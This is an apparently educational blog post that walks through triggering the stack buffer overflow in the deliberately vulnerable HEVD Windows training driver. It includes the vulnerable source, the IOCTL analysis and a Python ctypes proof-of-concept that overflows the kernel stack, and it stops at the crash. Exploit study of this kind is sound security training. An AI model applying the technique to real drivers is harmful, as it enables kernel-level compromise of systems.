---
layout: post
title: "HEVD: Stack Overflow exploitation"
date: 2022-01-04 09:00:00 +0100
categories: [HEVD, Stack Overflow]
tags: [exploit, driver, x86, shellcode, kernel exploitation]
---


## <span class="myheader">Loading HEVD driver</span>

In this post we will be exploiting the Stack Overflow vulnerability in the [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) driver. Before that, I recommend to read the previous blogpost where I explain some basic concepts.

To load the driver, we download first the pre-built executable from [here](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases) (or build it from source if you have too much time). Then, we download and run the [OSR Driver Loader](https://www.osronline.com/article.cfm%5earticle=157.htm) to load the driver in the debugee:

![OSR tool](/assets/img/osr_tool.png)
_OSR Driver Loader_

If all went well, we should see a new driver in the list of loaded modules:

![HEVD loaded](/assets/img/windbg_loaded_hevd.png)
_HEVD loaded in the debugee_

Red line marks memory address where the driver was loaded.


## <span class="myheader">Vulnerability</span>

Vulnerability exists in the [BufferOverflowStack.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/BufferOverflowStack.c) file, in the <code>TriggerBufferOverflowStack</code> function:

```c
#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
```

Inspecting <code>else</code> condition, we notice that the <code>RtlCopyMemory</code> function copies full length of the supplied <code>UserBuffer</code> to the <code>KernelBuffer</code> leading to the stack buffer overflow vulnerability, as we are able to overwrite information on the stack and diverge the code execution from a current path to e.g. a shellcode. <code>Size</code> argument is not validated in any way and is equal to the size of the user supplied data:

```c
Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
```

In the <code>SECURE</code> version, this is taken care of as max length of the copied data is not larger than the <code>KernelBuffer</code> itself as specified by the <code>sizeof</code> operator. 

## <span class="myheader">Exploitation</span>

To exploit this vulnerability we need to make the driver code follow the correct execution flow and reach the vulnerable code. Below we can observe in IDA Pro what is the path we need to take:

![IDA Stack BO path](/assets/img/ida_stackbo_path.png)
*stack buffer overflow path in IDA Pro*

<code>DriverEntry</code> is the first piece of code called after a driver is loaded. In the code there is also <code>IrpDeviceIoCtlHandler</code> function defined that handles incoming IOCTL control codes inside IRP packets.
Based on the information in the packet, function will redirect execution to the appropriate IOCTL handler - <code>BufferOverflowStackIoCtlHandler</code> in this case - which is a wrapper for <code>TriggerBufferOverflowStack</code> that contains the vulnerable code as described in the 'Vulnerability' section above.

Our next task is to determine what IOCTL needs to be send to trigger the vulnerability.

### <span class="myheader">IOCTL</span>

Let's have a look at the source code first.
<br>
<code>IrpDeviceIoCtlHandler</code> function uses *switch* statement to transfer control to a correct handler, depending on the IOCTL received:

![IrpDeviceIoCtlHandler source code](/assets/img/code_IrpDeviceIoCtlHandler.png)
*source code of the IrpDeviceIoCtlHandler*

Driver will execute the <code>BufferOverflowStackIoctlHandler</code> function, in case of *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* value in the switch statement. *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* is a macro that corresponds to the IOCTL with 0x800 function code in it. So in order to trigger the vulnerability, we need to use 0x800 in the IOCTL creation. Other IOCTL sections are constant: *FILE_DEVICE_UNKNOWN, METHOD_NEITHER, FILE_ANY_ACCESS*

![IOCTL definitions](/assets/img/code_IOCTL_definitions.png)
*IOCTL definitions*

This is how the disassembled <code>IrpDeviceIoCtlHandler</code> function code looks in IDA:

![IrpDeviceIoCtlHandler](/assets/img/ida_stackbo_flow.png)
*switch statement and IOCTL handler*

<code>0x222003</code> is deducted from the IOCTL value held in ECX and the result is loaded into EAX register (1). If the difference is larger than <code>0x6C</code>, program jumps to a different part of code to return *"[-] Invalid IOCTL Code: "* message. It means there are 109 possible IOCTL codes that will be accepted by the program, in the range <code>0x222003 - 0x22206f</code>.

<br>

If the difference is smaller or equal to <code>0x6C</code>, the IOCTL is used in the *jmp* instruction to jump to the correct offset from the jump table (2). In the bottom of the picture, we see code at one of the offsets that calls <code>BufferOverflowStackIoctlHandler</code>(3).

<br>

To create IOCTLs, we can use online IOCTL decoder [^1] and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:

![Online IOCTL decoder](/assets/img/online_ioctl_decoder.png)
*online IOCTL decoder*

We can also create IOCTL values from scratch with some Python code. To do that, we need look up hex values of the IOCTL constants (e.g. [here](https://github.com/tandasat/WinIoCtlDecoder/blob/master/plugins/WinIoCtlDecoder.py)): 
+ FILE_DEVICE_UNKNOWN = 0x22 
+ METHOD_NEITHER = 0x3
+ FILE_ANY_ACCESS = 0x0

From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4) we know that we have to move *Device Type* to the 16th bit, *Required Access* to the 14th bit, *Function Code* to 2nd and *Transfer Type* to the end:

```python
ioctl = hex((0x22 << 16) | (0x0 << 14) | (0x800 << 2) | 0x3)
```

### <span class="myheader">Exploit code</span>

With all the relevant information needed to trigger the vulnerability, we can build exploit. To develop exploit we will use <code>ctypes</code> library that allow Python code to call C functions and enable low-level memory manipulation.
<br>
To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API[^1], putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.

![Name of HEVD device](/assets/img/winobj_nameOfHevdDevice.png)
*device name in WinObj tool*

To send and receive messages to and from kernel driver, we can use <code>DeviceIoControl</code> API. Before we do that, we need to create proper IOCTL that will be dissected and understood by the HEVD device. We can use for that 

```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32

# open handle to the device
hevd = kernel32.CreateFileW(
    "\\\\.\\HackSysExtremeVulnerableDriver",    # file name
    0xC0000000,     # access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
    0,                                          
    None,
    0x3,            # action to take on a device: OPEN EXISTING 
    0,
    None
)
    
if (not hevd) or (hevd == -1):
    print("[-] Failed to retrieve handle: " + str(GetLastError()))
    sys.exit(1)

# malicious payload
payload = "\x41" * 3000
payload_size = len(payload)

# send message to the device
kernel32.DeviceIoControl(
    hevd,               # device handle
    0x222003,           # IOCTL
    payload,            
    payload_size,       
    None,
    0,
    byref(c_ulong()),
    None
)
```

In WinDbg, in the debugger machine, we enable printing debug messages and put breakpoint at <code>TriggerBufferOverflowStack</code> function to see what happens when we execute above code.

```c
ed Kd_DEFAULT_Mask 8
!sym noisy
.reload /f *.*
bp HEVD!TriggerBufferOverflowStack
```

If there are no debug messages printed in the WinDbg output, try to run below command on the debuggee:

```c
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter" /v DEFAULT /t REG_DWORD /d 0xf
```
![BP triggered](/assets/img/windbg_bp_TriggerBufferOverflowStack.png)
![Buffer Overflow](/assets/img/windbg_stackBO.png)

## <span class="myheader">References<span>

[^1]: https://www.osronline.com/article.cfm%5earticle=229.htm
[^2]: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew